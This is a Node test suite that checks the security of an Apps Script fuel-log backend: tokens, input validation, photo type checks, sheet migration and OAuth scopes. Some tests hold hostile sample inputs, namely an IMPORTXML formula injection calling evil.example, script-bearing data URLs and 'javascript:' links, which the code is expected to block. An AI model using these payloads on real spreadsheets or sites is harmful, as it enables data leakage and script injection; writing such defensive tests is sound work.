// Security checks in the Apps Script backend, run in Node with small stand-ins for
// the Apps Script services they touch.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const TOKEN = 'a'.repeat(64);
const ctx = {
  console: { log() {}, warn() {}, error() {} },
  Utilities: {
    base64Decode: (s) => Array.from(Buffer.from(s, 'base64')).map((b) => (b > 127 ? b - 256 : b)),
    newBlob: (bytes, type, name) => ({ bytes, type, name }),
  },
  PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k === 'APP_TOKEN' ? TOKEN : null) }) },
  ContentService: {
    MimeType: { JSON: 'json' },
    createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
  },
};
vm.createContext(ctx);
for (const f of ['src/Code.js', 'src/stats.js', 'src/parse.js']) {
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', f), 'utf8'), ctx);
}
const plain = (x) => JSON.parse(JSON.stringify(x));
const post = (obj) => JSON.parse(ctx.doPost({ postData: { contents: typeof obj === 'string' ? obj : JSON.stringify(obj) } }).text);

test('requests without the right token are refused, revealing nothing', () => {
  for (const body of [{}, { token: 'nope', action: 'status' }, { token: TOKEN.slice(1), action: 'status' },
    { token: TOKEN + 'a', action: 'status' }, 'not json', '']) {
    assert.deepStrictEqual(post(body), { ok: false, error: 'unauthorized' });
  }
});

test('unknown action does not echo input back', () => {
  assert.deepStrictEqual(post({ token: TOKEN, action: '<script>' }), { ok: false, error: 'unknown action' });
});

test('constant-time compare', () => {
  assert.strictEqual(ctx.safeEquals_('abc', 'abc'), true);
  assert.strictEqual(ctx.safeEquals_('abd', 'abc'), false);
  assert.strictEqual(ctx.safeEquals_('ab', 'abc'), false);
  assert.strictEqual(ctx.safeEquals_('abcd', 'abc'), false);
});

test('GET reveals nothing', () => {
  assert.strictEqual(ctx.doGet().text, '');
});

test('text that would run as a formula is neutralized', () => {
  for (const evil of ['=IMPORTXML("https://evil.example","//a")', '+1+1', '-2', '@SUM(A1)', '\t=1', '\r=1']) {
    assert.ok(ctx.safeText_(evil).startsWith("'"), evil);
  }
  assert.strictEqual(ctx.safeText_('Shell on 5th'), 'Shell on 5th');
  assert.strictEqual(ctx.safeText_('a\u0000b'), 'ab');
});

test('entry validation', () => {
  const good = { id: 'abc-12345', date: Date.now(), odometer: 280500, litres: 40, total: 64, full: true, notes: 'x' };
  const e = ctx.validateEntry_(good);
  assert.strictEqual(e.cents, 160); // worked out from litres and total
  assert.strictEqual(ctx.validateEntry_({ ...good, total: null, cents_per_litre: 159.9 }).total, 63.96);
  assert.strictEqual(ctx.validateEntry_({ ...good, cents_per_litre: 1.599 }).cents, 159.9); // dollars → cents
  assert.strictEqual(ctx.validateEntry_({ ...good, notes: 'n'.repeat(5000) }).notes.length, 500);

  const bad = [
    null, 'string', {},
    { ...good, odometer: -5 }, { ...good, odometer: 9e9 }, { ...good, litres: 0 }, { ...good, litres: 1e6 },
    { ...good, total: 1e9 }, { ...good, cents_per_litre: 99999 },
    { ...good, date: 'garbage' }, { ...good, date: Date.now() + 30 * 864e5 }, { ...good, date: 0 },
    { ...good, id: '=HYPERLINK("x")' }, { ...good, id: 'short' }, { ...good, id: 'x'.repeat(100) },
  ];
  for (const b of bad) assert.throws(() => ctx.validateEntry_(b), JSON.stringify(b));
});

test('photos: only real JPEG/PNG/WebP of reasonable size', () => {
  const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(20)]).toString('base64');
  const png = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47]), Buffer.alloc(20)]).toString('base64');
  const html = Buffer.from('<html><script>alert(1)</script></html>').toString('base64');
  assert.strictEqual(ctx.decodeDataUrl_('data:image/jpeg;base64,' + jpeg).mimeType, 'image/jpeg');
  assert.strictEqual(ctx.decodeDataUrl_('data:image/png;base64,' + png).mimeType, 'image/png');
  assert.strictEqual(ctx.decodeDataUrl_(null), null);
  for (const bad of [
    'data:text/html;base64,' + html,           // wrong type
    'data:image/jpeg;base64,' + html,          // lies about its type
    'data:image/svg+xml;base64,' + html,       // SVG can carry script
    'data:image/png;base64,' + jpeg,           // mismatched signature
    'data:image/jpeg;base64,' + 'A'.repeat(12 * 1024 * 1024), // too big
    'javascript:alert(1)', 42,
  ]) {
    assert.throws(() => ctx.decodeDataUrl_(bad), String(bad).slice(0, 40));
  }
});

test('column numbers match the header row', () => {
  const headers = vm.runInContext('HEADERS', ctx);
  const col = vm.runInContext('COL', ctx);
  const expected = {
    date: 'Date', odometer: 'Odometer (km)', litres: 'Litres', cents: '¢/L', total: 'Total',
    full: 'Full?', distance: 'Distance (km)', economy: 'L/100 km', mpg: 'MPG (US)', perKm: '$/km',
    odoPhoto: 'Odometer photo', pumpPhoto: 'Pump photo', notes: 'Notes', id: 'ID',
  };
  for (const [key, title] of Object.entries(expected)) assert.strictEqual(headers[col[key] - 1], title, key);
  assert.strictEqual(headers.length, Object.keys(col).length);
  // recalculateAll writes distance, economy, mpg, perKm as one block of 4 columns.
  assert.deepStrictEqual([col.distance, col.economy, col.mpg, col.perKm], [7, 8, 9, 10]);
});

// A stand-in sheet: a 2-D array with just the methods ensureLayout_ uses.
function fakeSheet(rows) {
  const sheet = {
    rows,
    getLastColumn: () => Math.max(...rows.map((r) => r.length)),
    getLastRow: () => rows.length,
    getMaxRows: () => 100,
    getParent: () => ({}),
    setFrozenRows() {},
    insertColumnAfter(c) { rows.forEach((r) => r.splice(c, 0, '')); },
    getRange(r, c, nr = 1, nc = 1) {
      return {
        getValues: () => rows.slice(r - 1, r - 1 + nr).map((row) => {
          const out = row.slice(c - 1, c - 1 + nc);
          while (out.length < nc) out.push('');
          return out;
        }),
        setValues(v) { v.forEach((vr, i) => vr.forEach((x, j) => { rows[r - 1 + i][c - 1 + j] = x; })); return this; },
        setFontWeight() { return this; },
        setNumberFormat() { return this; },
      };
    },
  };
  return sheet;
}

test('an older sheet layout is upgraded without moving data into the wrong columns', () => {
  const oldUS = ['Date', 'Odometer', 'Gallons', '$/gal', 'Total', 'Full?', 'Miles', 'MPG', '$/mile',
    'Odometer photo', 'Pump photo', 'Notes', 'ID'];
  const row = ['2026-11-03', 280500, 45.2, 159.9, 72.27, true, '', '', '', '=HYPERLINK("o")', '=HYPERLINK("p")', 'first fill', 'abc-12345'];
  const sheet = fakeSheet([oldUS.slice(), row.slice()]);
  let recalculated = 0;
  ctx.setupSummary_ = () => {};
  ctx.recalculateAll = () => { recalculated++; };
  ctx.layoutChecked_ = false;
  vm.runInContext('layoutChecked_ = false', ctx);
  ctx.ensureLayout_(sheet, false);

  const headers = vm.runInContext('HEADERS', ctx);
  const col = vm.runInContext('COL', ctx);
  assert.deepStrictEqual(sheet.rows[0], [...headers]);
  const data = sheet.rows[1];
  assert.strictEqual(data[col.odometer - 1], 280500);
  assert.strictEqual(data[col.litres - 1], 45.2);
  assert.strictEqual(data[col.notes - 1], 'first fill');
  assert.strictEqual(data[col.id - 1], 'abc-12345');
  assert.strictEqual(data[col.pumpPhoto - 1], '=HYPERLINK("p")');
  assert.strictEqual(recalculated, 1, 'computed columns are recalculated');

  // Running again changes nothing (no second column inserted).
  vm.runInContext('layoutChecked_ = false', ctx);
  ctx.ensureLayout_(sheet, false);
  assert.strictEqual(sheet.rows[0].length, headers.length);
  assert.strictEqual(recalculated, 1);
});

// A stand-in sheet for attachPhotos: cells hold {value, formula}, keyed by "row,col".
function cellSheet(idsByRow) {
  const cells = {};
  const key = (r, c) => r + ',' + c;
  const col = vm.runInContext('COL', ctx);
  idsByRow.forEach((id, i) => { cells[key(i + 2, col.id)] = { value: id, formula: '' }; });
  const get = (r, c) => cells[key(r, c)] || (cells[key(r, c)] = { value: '', formula: '' });
  return {
    cells, get,
    getLastRow: () => idsByRow.length + 1,
    getRange(r, c, nr, nc) {
      if (nr) return { getValues: () => Array.from({ length: nr }, (_, i) => [get(r + i, c).value]) };
      return {
        getValue: () => get(r, c).value,
        getFormula: () => get(r, c).formula,
        setFormula(f) { get(r, c).formula = f; get(r, c).value = 'photo'; return this; },
      };
    },
  };
}

test('adding photos to a past fill-up', () => {
  const col = vm.runInContext('COL', ctx);
  const jpeg = 'data:image/jpeg;base64,' + Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(20)]).toString('base64');
  const sheet = cellSheet(['first-fill-0001', 'second-fill-002']);
  let saved = 0;
  ctx.LockService = { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) };
  ctx.Session = { getScriptTimeZone: () => 'America/Toronto' };
  ctx.Utilities.formatDate = () => '2026-11-03 0900';
  vm.runInContext('fillupsSheet_ = function () { return __sheet; }; savePhoto_ = function () { __saved++; return \'=HYPERLINK("https://drive.google.com/file/d/new/view","photo")\'; }', Object.assign(ctx, { __sheet: sheet, __saved: 0 }));

  // Fills the right row (the second fill-up is row 3).
  assert.deepStrictEqual(plain(ctx.attachPhotos('second-fill-002', { odometer: jpeg, pump: jpeg }, false)),
    { attached: ['odometer', 'pump'], skipped: [] });
  assert.match(sheet.get(3, col.odoPhoto).formula, /drive\.google\.com/);
  assert.strictEqual(sheet.get(2, col.odoPhoto).formula, '', 'other rows untouched');

  // A retry doesn't add a second copy; replace does.
  saved = vm.runInContext('__saved', ctx);
  assert.deepStrictEqual(plain(ctx.attachPhotos('second-fill-002', { odometer: jpeg }, false)), { attached: [], skipped: ['odometer'] });
  assert.strictEqual(vm.runInContext('__saved', ctx), saved, 'nothing saved to Drive on a skipped slot');
  assert.deepStrictEqual(plain(ctx.attachPhotos('second-fill-002', { odometer: jpeg }, true)), { attached: ['odometer'], skipped: [] });

  // A photo link pasted by hand counts as already having a photo.
  sheet.get(2, col.pumpPhoto).value = 'https://drive.google.com/file/d/manual/view';
  assert.deepStrictEqual(plain(ctx.attachPhotos('first-fill-0001', { pump: jpeg }, false)), { attached: [], skipped: ['pump'] });

  assert.throws(() => ctx.attachPhotos('missing-fill-0003', { pump: jpeg }, false), /isn't in the sheet/);
  assert.throws(() => ctx.attachPhotos('=HYPERLINK("x")', { pump: jpeg }, false), /not valid/);
  assert.throws(() => ctx.attachPhotos('first-fill-0001', {}, false), /No photos/);
  assert.throws(() => ctx.attachPhotos('first-fill-0001', { pump: 'data:text/html;base64,PGI+' }, false), /JPEG/);
});

test('photo links are read from the script\'s formula or a pasted link, Drive only', () => {
  assert.strictEqual(ctx.photoUrl_('=HYPERLINK("https://drive.google.com/file/d/abc/view","photo")', 'photo'),
    'https://drive.google.com/file/d/abc/view');
  assert.strictEqual(ctx.photoUrl_('', 'https://drive.google.com/file/d/xyz/view?usp=sharing'),
    'https://drive.google.com/file/d/xyz/view?usp=sharing');
  assert.strictEqual(ctx.photoUrl_('', 'https://evil.example/photo.jpg'), '');
  assert.strictEqual(ctx.photoUrl_('', 'javascript:alert(1)'), '');
  assert.strictEqual(ctx.photoUrl_('', ''), '');
});

test('manifest asks only for narrow scopes', () => {
  const manifest = JSON.parse(fs.readFileSync(path.join(__dirname, '..', 'src', 'appsscript.json'), 'utf8'));
  assert.deepStrictEqual(manifest.oauthScopes.sort(), [
    'https://www.googleapis.com/auth/drive.file',
    'https://www.googleapis.com/auth/script.external_request',
    'https://www.googleapis.com/auth/spreadsheets.currentonly',
  ]);
  const code = fs.readFileSync(path.join(__dirname, '..', 'src', 'Code.js'), 'utf8')
    .replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, ''); // ignore comments
  for (const broad of ['DriveApp.', 'DocumentApp.', 'openById', 'openByUrl', 'GmailApp', 'CalendarApp']) {
    assert.ok(!code.includes(broad), `${broad} would need a broader scope`);
  }
});
